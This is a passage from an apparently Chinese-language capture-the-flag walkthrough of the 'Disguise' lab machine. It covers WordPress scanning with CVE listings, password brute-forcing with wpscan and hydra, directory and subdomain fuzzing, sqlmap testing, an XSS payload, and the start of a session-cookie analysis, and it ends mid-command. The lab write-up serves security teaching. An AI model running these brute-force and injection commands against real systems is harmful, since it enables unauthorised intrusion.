 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://disguise.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://disguise.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://disguise.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.8.1 identified (Latest, released on 2025-04-30).
 | Found By: Rss Generator (Passive Detection)
 |  - http://disguise.hmv/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;
 |  - http://disguise.hmv/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.8.1&lt;/generator&gt;

[+] WordPress theme in use: newscrunch
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | [!] The version is out of date, the latest version is 1.8.5
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1
 | Style Name: Newscrunch
 | Style URI: https://spicethemes.com/newscrunch
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 | Confirmed By: Css Style In 404 Page (Passive Detection)
 |
 | Version: 1.8.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css?ver=6.8.1, Match: 'Version: 1.8.4.2'

[+] Enumerating Most Popular Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] *
 | Location: http://disguise.hmv/wp-content/plugins/*/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Most Popular Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:00:03 &lt;===================================================================================================&gt; (400 / 400) 100.00% Time: 00:00:03
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] newsblogger
 | Location: http://disguise.hmv/wp-content/themes/newsblogger/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newsblogger/readme.txt
 | [!] The version is out of date, the latest version is 0.2.5.6
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/newsblogger/style.css
 | Style Name: NewsBlogger
 | Style URI: https://spicethemes.com/newsblogger-wordpress-theme/
 | Description: NewsBlogger is a dynamic and versatile child theme for the popular NewCrunch WordPress theme. Perfec...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://disguise.hmv/wp-content/themes/newsblogger/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: NewsBlogger &lt; 0.2.5.5 - Cross-Site Request Forgery to Arbitrary Plugin Installation
 |     Fixed in: 0.2.5.5
 |     References:
 |      - https://wpscan.com/vulnerability/916ba2a7-6592-4abf-acbf-63e46111b964
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1305
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/7b2cac27-4a36-490f-b2d8-3c6f32843a38
 |
 | [!] Title: NewsBlogger &lt; 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload
 |     Fixed in: 0.2.5.2
 |     References:
 |      - https://wpscan.com/vulnerability/ab2f96dc-e786-48db-8207-a76ec50d7e63
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-1304
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/85cea6b5-d57b-495e-a504-a0c1ba691637
 |
 | Version: 0.2.5.1 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newsblogger/style.css, Match: 'Version: 0.2.5.1'

[+] newscrunch
 | Location: http://disguise.hmv/wp-content/themes/newscrunch/
 | Last Updated: 2025-05-07T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/newscrunch/readme.txt
 | [!] The version is out of date, the latest version is 1.8.5
 | Style URL: http://disguise.hmv/wp-content/themes/newscrunch/style.css
 | Style Name: Newscrunch
 | Style URI: https://spicethemes.com/newscrunch
 | Description: Newscrunch is a magazine and blog theme. It is a lightweight, elegant, and fully responsive theme sp...
 | Author: spicethemes
 | Author URI: https://spicethemes.com
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By:
 |  Urls In 404 Page (Passive Detection)
 |  Known Locations (Aggressive Detection)
 |   - http://disguise.hmv/wp-content/themes/newscrunch/, status: 500
 |
 | Version: 1.8.4.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/newscrunch/style.css, Match: 'Version: 1.8.4.2'

[+] twentytwentyfive
 | Location: http://disguise.hmv/wp-content/themes/twentytwentyfive/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfive/readme.txt
 | [!] The version is out of date, the latest version is 1.2
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.0'

[+] twentytwentyfour
 | Location: http://disguise.hmv/wp-content/themes/twentytwentyfour/
 | Latest Version: 1.3 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentyfour/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.3'

[+] twentytwentythree
 | Location: http://disguise.hmv/wp-content/themes/twentytwentythree/
 | Latest Version: 1.6 (up to date)
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://disguise.hmv/wp-content/themes/twentytwentythree/readme.txt
 | [!] Directory listing is enabled
 | Style URL: http://disguise.hmv/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://disguise.hmv/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.6'

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to 'Plain' for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:00 &lt;===============================================================================================&gt; (100 / 100) 100.00% Time: 00:00:00

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;=====================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] simpleadmin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://disguise.hmv/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] simpleAdmin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 7
 | Requests Remaining: 18

[+] Finished: Thu May 15 22:20:43 2025
[+] Requests Done: 598
[+] Cached Requests: 26
[+] Data Sent: 176.914 KB
[+] Data Received: 23.432 MB
[+] Memory used: 285.922 MB
[+] Elapsed time: 00:00:18
```

WPScan扫描结果的关键信息：

*   `robots.txt`文件存在。
*   WordPress 版本为 `6.8.1` (最新版)。
*   主题 `newsblogger` 版本为 `0.2.5.1`，存在两个已知漏洞：
    *   `CVE-2025-1305`: NewsBlogger &lt; 0.2.5.5 - CSRF to Arbitrary Plugin Installation.
    *   `CVE-2025-1304`: NewsBlogger &lt; 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload. （这个看起来更有利用价值）
*   发现用户 `simpleadmin` (以及 `simpleAdmin`，可能为同一用户)。

## 2.3 密码爆破尝试 (WordPress &amp; SSH)

基于发现的用户 `simpleadmin`，尝试对其WordPress后台密码进行爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wpscan --url http://disguise.hmv -U simpleadmin -P /usr/share/wordlists/rockyou.txt --random-user-agent
```

同时，在另一个终端窗口尝试爆破SSH服务密码。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ hydra -l simpleadmin -P 5000q.txt ssh://192.168.205.211 -I -u -f -e nsr -t 64
```

经过约10分钟的等待，两个爆破均未成功，判断密码爆破的路径可能行不通。

## 2.4 Web目录爆破

尝试使用`gobuster`对`http://disguise.hmv`进行目录爆破，以发现可能存在的隐藏页面或资源。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dir -u http://disguise.hmv -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,md,html,zip
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://disguise.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,md,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/]
/rss                  (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/login                (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php]
/login.php            (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php]
/0                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/0/]
/feed                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/atom                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/atom/]
/s                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/wp-content           (Status: 301) [Size: 317] [--&gt; http://disguise.hmv/wp-content/]
/admin                (Status: 302) [Size: 0] [--&gt; http://disguise.hmv/wp-admin/]
/h                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/2025/04/01/hello-world/]
/wp-login.php         (Status: 200) [Size: 5275]
/rss2                 (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/license.txt          (Status: 200) [Size: 19903]
/wp-includes          (Status: 301) [Size: 318] [--&gt; http://disguise.hmv/wp-includes/]
/wp-register.php      (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/wp-login.php?action=register]
/S                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/wp-rss2.php          (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/]
/H                    (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/2025/04/01/hello-world/]
/sa                   (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/sample-page/]
/rdf                  (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--&gt; http://disguise.hmv/]
Progress: 9864 / 1323360 (0.75%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 9882 / 1323360 (0.75%)
[ERROR] context canceled
[ERROR] context canceled
[ERROR] context canceled
===============================================================
Finished
===============================================================
```

目录爆破运行约2分钟后，发现扫描速度非常缓慢，推测WordPress站点可能存在WAF或其他防护机制。决定暂停扫描，寻找其他突破口。

# 三、网络层面信息发掘

## 3.1 IPv6探测

尝试从IPv6层面进行探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ping6 -I eth0 ff02::1
ping6: Warning: IPv6 link-local address on ICMP datagram socket may require ifname or scope-id =&gt; use: address%&lt;ifname|scope-id&gt;
ping6: Warning: source address might be selected on device other than: eth0
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=1 ttl=64 time=0.112 ms
64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=1 ttl=64 time=0.744 ms
64 bytes from fe80::9ffa:901:c1:10b9%eth0: icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from fe80::a00:27ff:feea:d3f5%eth0: icmp_seq=2 ttl=64 time=0.322 ms
^C
--- ff02::1 ping statistics ---
2 packets transmitted, 2 received, +2 duplicates, 0% packet loss, time 1022ms
rtt min/avg/max/mdev = 0.036/0.303/0.744/0.275 ms
```

`ping6`发现了两个IPv6本地链路地址。其中 `fe80::a00:27ff:feea:d3f5%eth0` 的MAC地址与之前IPv4扫描的目标主机MAC地址 `08:00:27:EA:D3:F5` 相符 (EUI-64转换)。
对这两个IPv6地址进行`nmap`端口扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -p- fe80::9ffa:901:c1:10b9%eth0  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT
Nmap scan report for fe80::9ffa:901:c1:10b9
Host is up (0.0000070s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.33 seconds
                                                                                                                                                                                   
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -p- fe80::a00:27ff:feea:d3f5%eth0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:41 EDT
Nmap scan report for fe80::a00:27ff:feea:d3f5
Host is up (0.00011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds
```

对与目标MAC地址一致的IPv6地址 `fe80::a00:27ff:feea:d3f5%eth0` 进行服务版本探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ nmap -6 -sV -p22,80 fe80::a00:27ff:feea:d3f5%eth0
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 22:42 EDT
Nmap scan report for fe80::a00:27ff:feea:d3f5
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
MAC Address: 08:00:27:EA:D3:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
```

IPv6扫描结果与IPv4一致，开放SSH (OpenSSH 7.9p1) 和 HTTP (Apache 2.4.59) 服务。

## 3.2 流量监听

使用`tcpdump`监听目标主机 `192.168.205.211` 的网络流量，观察是否有异常通信。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo tcpdump -i eth0 host 192.168.205.211 -nn
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
22:44:40.505340 IP 192.168.205.211.41597 &gt; 162.159.200.1.123: NTPv4, Client, length 48
22:44:40.876037 ARP, Request who-has 192.168.205.211 tell 192.168.205.2, length 46
22:44:40.876365 ARP, Reply 192.168.205.211 is-at 08:00:27:ea:d3:f5, length 46
22:44:40.876419 IP 162.159.200.1.123 &gt; 192.168.205.211.41597: NTPv4, Server, length 48
22:44:45.642888 ARP, Request who-has 192.168.205.2 tell 192.168.205.211, length 46
22:44:45.642969 ARP, Reply 192.168.205.2 is-at 00:50:56:f4:ef:6f, length 46
^C
6 packets captured
6 packets received by filter
0 packets dropped by kernel
```

经过约1分钟的监听，捕获到的主要是NTP和ARP报文，未发现有价值的信息。

# 四、子域名爆破与关键发现

## 4.1 FFUF子域名爆破 (初试)

将注意力转回Web层面，尝试进行子域名爆破。使用`ffuf`工具，通过修改Host头的方式进行探测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ ffuf -u http://disguise.hmv/ -H 'Host: FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -fw 11916

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://disguise.hmv/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.disguise.hmv
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 11916
________________________________________________

www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

`ffuf`发现了一个子域名 `www.disguise.hmv`。将其添加到 `/etc/hosts` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo nano /etc/hosts

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.205.211 www.disguise.hmv disguise.hmv
```

使用`curl`检查 `www.disguise.hmv`。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ curl -I http://www.disguise.hmv
HTTP/1.1 301 Moved Permanently
Date: Fri, 16 May 2025 02:53:06 GMT
Server: Apache/2.4.59 (Debian)
X-Redirect-By: WordPress
Location: http://disguise.hmv/
Content-Type: text/html; charset=UTF-8
```

该子域名通过301重定向到主站 `http://disguise.hmv/`，没有提供新的攻击面。

## 4.2 Gobuster DNS模式子域名爆破

考虑到`ffuf`扫描速度也较慢，尝试使用`gobuster`的DNS模式进行子域名爆破，首先使用大字典。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 3541 / 114442 (3.09%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 3553 / 114442 (3.10%)
===============================================================
Finished
===============================================================
```

`gobuster`使用大字典时也仅发现了 `www.disguise.hmv`。更换为较小的字典再次尝试。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

小字典扫描完毕，仍然只有 `www.disguise.hmv`。没办法了，也没其他的路了，硬扫吧。再次使用大字典进行扫描。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ gobuster dns -d disguise.hmv -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     disguise.hmv
[+] Threads:    64
[+] Timeout:    1s
[+] Wordlist:   /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.disguise.hmv

Progress: 25708 / 114442 (22.46%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 25739 / 114442 (22.49%)
===============================================================
Finished
===============================================================
```

蛙趣，不对啊，2w多都没出来这么夸张？看看其他人的wp。操.......好像是软件问题。

## 4.3 Wfuzz子域名爆破 (转机)

更换为`wfuzz`工具，同样通过修改Host头的方式进行子域名爆破。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ wfuzz -c -u 'http://disguise.hmv/' -H 'HOST:FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 4602
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://disguise.hmv/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000001:   301        0 L      0 W        0 Ch        'www - www'
000005051:   200        18 L     52 W       846 Ch      'dark - dark'
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 236.0730
Processed Requests: 8494
Filtered Requests: 8492
Requests/sec.: 35.98038
```

`wfuzz`成功爆破出新的子域名 `dark.disguise.hmv`！

沉默是今晚的康桥。

将新发现的子域名 `dark.disguise.hmv` 添加到 `/etc/hosts` 文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sudo nano /etc/hosts
[sudo] password for kali:

┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

192.168.205.211 www.disguise.hmv disguise.hmv dark.disguise.hmv
```

访问 `http://dark.disguise.hmv`。
![image-20250516110839064](https://7r1umphk.github.io/image/20250516110839497.webp)
页面显示为一个名为“暗黑商店”的站点，风格有点炫。

# 五、暗黑商店 (dark.disguise.hmv) 渗透测试

## 5.1 初步探索与注册功能分析

查看新站点的页面源码，未发现明显可利用信息。尝试使用之前在WordPress站点发现的用户名 `simpleAdmin` 进行弱密码登录，失败。
观察注册页面 (register.php)，发现其表单提交时存在前端JavaScript校验函数 `validateForm`，该函数限制用户名长度不能超过8个字符。

```javascript
// validateForm (部分示例)
function validateForm() {
    var username = document.forms['register']['username'].value;
    if(username.length &gt; 8) {
        alert('用户名不能超过8个字符');
        return false;
    }
    return true;
}
```

由于目标用户 `simpleAdmin` (11字符) 长度超过8位，该前端校验会阻止注册。可以通过浏览器开发者工具删除或修改此JS函数来绕过前端校验。

首先注册一个普通用户 `admin`，密码 `111111`，以熟悉系统功能。
登录后进入个人中心页面 (profile.php)。

```html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;个人中心 - 暗黑商店&lt;/title&gt;
    &lt;link rel='stylesheet' href='style3.css'&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;header&gt;
        &lt;h1&gt;暗黑商店&lt;/h1&gt;
        &lt;nav&gt;
            &lt;span&gt;欢迎, admin
            &lt;/span&gt; |
            &lt;a href='index.php'&gt;首页&lt;/a&gt; |
                        &lt;a href='logout.php'&gt;退出&lt;/a&gt;
        &lt;/nav&gt;
    &lt;/header&gt;

    &lt;div class='profile'&gt;
        &lt;h2&gt;个人中心&lt;/h2&gt;
        &lt;p&gt;欢迎访问您的个人主页，这里可以查看和管理您的账户信息&lt;/p&gt;

            &lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;
```

页面源码依然简洁。使用BurpSuite抓取HTTP请求，发现登录后的Cookie中包含一个名为 `dark_session` 的字段，其值经过了URL编码，末尾的 `%3D%3D` 暗示其可能是Base64编码。

```http
GET /profile.php HTTP/1.1
Host: dark.disguise.hmv
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://dark.disguise.hmv/login.php
Connection: keep-alive
Cookie: PHPSESSID=g31oqe3lpvnk3gd1obs5pmm4a0; dark_session=1mr9fHMuTh6J56IrZHP28w%3D%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

这 `dark_session` 看起来有点机会，但目前尚不清楚其具体作用。

## 5.2 SQL注入与XSS尝试

在进一步分析 `dark_session` 前，先尝试常规的Web漏洞测试。
使用`sqlmap`对登录表单 (login.php) 进行SQL注入检测。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
└─$ sqlmap -u 'http://dark.disguise.hmv/login.php' --forms --batch --level=3 --risk=3
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.4#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:42:55 /2025-05-15/

[23:42:55] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=e2744i2rksa...aqbikf4hhl'). Do you want to use those [Y/n] Y
[23:42:55] [INFO] searching for forms
[1/1] Form:
POST http://dark.disguise.hmv/login.php
POST data: username=&amp;password=
do you want to test this form? [Y/n/q]
&gt; Y
Edit POST data [default: username=&amp;password=] (Warning: blank fields detected): username=&amp;password=
do you want to fill blank fields with random values? [Y/n] Y
# ... (大量sqlmap探测过程输出) ...
[23:43:21] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[23:43:21] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/.local/share/sqlmap/output/results-05152025_1142pm.csv'

[*] ending @ 23:43:21 /2025-05-15/
```

Sqlmap未发现SQL注入漏洞。
尝试在注册用户名的位置输入XSS payload `&lt;script&gt;alert(document.domain)&lt;/script&gt;`，密码 `111111`。登录后发现特殊字符 `&lt;` 和 `&gt;` 被HTML实体编码，XSS尝试失败。

## 5.3 Cookie (`dark_session`) 分析与伪造 (ECB Oracle Padding Attack)

重点分析 `dark_session` Cookie。
以用户 `admin` (密码 `111111`) 登录后获取的 `dark_session` 为 `1mr9fHMuTh6J56IrZHP28w%3D%3D`。
使用CyberChef进行URL解码，得到 `1mr9fHMuTh6J56IrZHP28w==`。
![image-20250516123651762](https://7r1umphk.github.io/image/20250516123652137.webp)
再进行Base64解码。
![image-20250516123753831](https://7r1umphk.github.io/image/20250516123754183.webp)
得到一串二进制乱码。通过命令行工具验证：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx]
